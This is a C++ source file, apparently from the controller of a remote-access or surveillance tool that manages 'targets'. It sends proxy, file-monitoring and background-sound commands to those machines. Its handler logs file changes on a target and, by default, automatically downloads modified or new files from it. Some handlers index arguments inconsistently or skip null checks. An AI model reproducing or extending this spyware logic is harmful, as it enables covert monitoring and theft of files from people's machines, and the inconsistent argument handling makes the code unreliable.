void  TargetConnection::Send_SSX(ULONG ulTargetID,  USHORT usPort, PCHAR lpszUser, PCHAR lpszPass)
{
    // TID PID PXY AUTH PORT USER PASS
    //  0   1   2   3     4    5    6
    //
    std::ostringstream ss;
    ss << ulTargetID << " 0 SSX 1 " << usPort
       << " " << lpszUser << " " << lpszPass << "\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_ESX(ULONG ulTargetID)
{
    // TID PID PXY
    //  0   1   2
    //
    std::ostringstream ss;
    ss << ulTargetID << " 0 ESX\r\n";
    Write(ss);
}

// ////////////////////////////////////////////////////////////////////////////////
// @public 文件监控命令
//
void TargetConnection::Send_FMT(DWORD dwTargetId, std::wstring path, ULONG add, std::wstring ext)
{
	// 初始化 

	// TID PID MTN
	//  0   1   2 
	//

	// 监控指定文件或文件夹

	// TID PID FMT ADD PathBase64 ExtBase64
	//  0   1   2   3      4          5
	//

	std::ostringstream buf;

	if ( L"" == path )
	{
		buf << dwTargetId << " 0 MTN\r\n";
	}
	else
	{
		buf << dwTargetId << " 0 FMT " << add << " " << GetBase64FromWide(path).c_str() << " " 
			<< GetBase64FromWide(ext).c_str() << "\r\n";
	}

	this->Write(buf);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 文件监控
//
int TargetConnection::Handle_FMT(std::vector<std::string> &args)
{
	// TID PID FMT ADD DIRPATHBASE64 OK
	//  0   1   2   3         4       5
	//

	// TID PID FMT     ADD DIRPATHBASE64 ERR ERRCODE
	//  0   1   2       3         4       5     6
	//

	// TID PID FMT WHERE  CHG   TIME    SIZE   PATHBASE64 
	// 0   1    2   3      4      5        6      7

	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
	Target * tarBlock = GetTargetFromGlobalMap(targetID);

	if ( NULL == tarBlock )
		return 0;

	std::string path;

	// 
	// 文件变化
	//
	if ( "CHG" == args[4] )
	{
		ULONG dwWhere = strtoul(args[3].c_str(),NULL,10);
		LONGLONG dwTime = _atoi64(args[5].c_str());

		path = args[7];
		// 去掉句末的分号
		path = path.substr(0, path.length()-1);
		int pos = path.rfind(';');
		std::string newFileName = path.substr(pos+1, path.length()-pos);
		path = path.substr(0, pos);
		
		LONGLONG size = _atoi64(args[6].c_str());
		
		WCHAR wzCount[MAX_PATH] = {0};
		std::wstring remark = ConvertFileChangeStatusToStr(dwWhere);

		if ( dwWhere == FILE_ACTION_RENAMED_OLD_NAME
			|| dwWhere == FILE_ACTION_RENAMED_NEW_NAME )
		{
			std::wstring newStr = GetWideFromBase64(newFileName);
			remark += L" : ";
			remark += newStr;
		}

		std::wstring realPath = GetWideFromBase64(path);

		DM->InsertFileMonitorRecord(targetID, remark, realPath, GetTimeFromLongLong(dwTime));

		SetStatusInfoExW(STATUS_INFO, L"[目标%s(ID:%u)] 监视到文件状态改变 \"%s\" ",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			realPath.c_str());

		SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] 监视到文件状态改变 \"%s\" ",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			realPath.c_str());

		CHG_INFO changeInfo;
		changeInfo.remark = remark;
		changeInfo.dwTime = dwTime;

		if (tarBlock->frmTarControl)
		{
			SendMessage(tarBlock->frmTarControl->Handle, WM_FILEMONITOR_CHANGED, (LONG)realPath.c_str(), (LONG)&changeInfo);
		}

		std::wstring ctrPathW = L"..";

		if ( tarBlock->bTarConnOnline
			&& 
			( dwWhere == FILE_ACTION_MODIFIED || dwWhere == FILE_ACTION_ADDED ))
		{
			// 下载文件
			std::wstring setting = GetExePath() + L"\\setting.ini";
			int download = ReadValueFromLocal(L"Control", L"AdvanceMonitorPolicy", setting.c_str());

			// 0 - Auto download
			// 1 - Ask before download
			// 2 - Disable download

			if ( 2 == download )
				return 0 ;

			if ( 1 == download )
			{
				WCHAR msg[1024] = {0};
				wsprintfW(msg, L"监控到文件 %s 发生变化\r\n是否下载?", realPath.c_str());

				if ( IDCANCEL == MessageBox(NULL, msg, L"提示", MB_OKCANCEL | MB_ICONINFORMATION) )
					return 0;
			}

			SetTarStatusInfoExW(STATUS_INFO, tarBlock, 
				L"添加任务 : 下载 \"%s\"", realPath.c_str());
			tarBlock->tarConn->Send_AFT(tarBlock->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(ctrPathW).c_str(),
				GetBase64FromWide(realPath).c_str(),
				(ULONG)size);
		}

		return 0;
	}


	if ("OK" == args[5])
	{
		std::wstring path = GetWideFromBase64(args[4]);
		time_t curtime;
		time(&curtime);
		std::string timStr = GetTimeString(curtime);
		ULONG add = strtoul(args[3].c_str(),NULL,10);

		if ( 1 == add )
			DM->InsertFileMonitorList(
				targetID, 
				GetNameFromPath(path, UnixLike(tarBlock) ? L'/' : L'\\'), 
				path, 
				AnsiToWide(TGetCurrentTime()).c_str(), 
				L"文件夹", 
				1);
		else
			DM->RemoveFileMonitorList(
				targetID,
				path);

		SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] %s监视 \"%s\"成功",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			add == 1 ? L"添加" : L"取消",
			path.c_str());

		if (tarBlock->frmTarControl)
		{
			SendMessage(tarBlock->frmTarControl->Handle, WM_FILEMONITOR_FINISHED, (LONG)path.c_str(), (ULONG)add);
		}
	}
	else      // ERR
	{
		std::wstring path = GetWideFromBase64(args[3]);
		int nErrCode = strtoul(args[5].c_str(), NULL, 10);
		ULONG add = strtoul(args[2].c_str(),NULL,10);

		SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%u)] %s监视 \"%s\" 失败: %s",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			L"添加",
			path.c_str(),
			ConvertErrorIdToStrW(nErrCode).c_str());
	}

	return 0;
}

int TargetConnection::Handle_BACKSOUND(std::vector<std::string>& args)
{
	// TID PID BGS ONOROFF RET

	if ( args.size() < 4 )
		return 0;

	bool on = args[3] == "1";
	bool ok = args[4] == "1";

	std::wstring infomation;

	if ( ok )
		infomation = L"背景音参数设置成功";
	else
		infomation = L"背景音参数设置失败";

	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
	Target * tarBlock = GetTargetFromGlobalMap(targetID);

	if ( tarBlock->frmTarControl )
	{
		SendMessage(tarBlock->frmTarControl->Handle, WM_BACKSOUND_SETTING, (WPARAM)(infomation.c_str()), NULL);
	}

	return 0 ;
}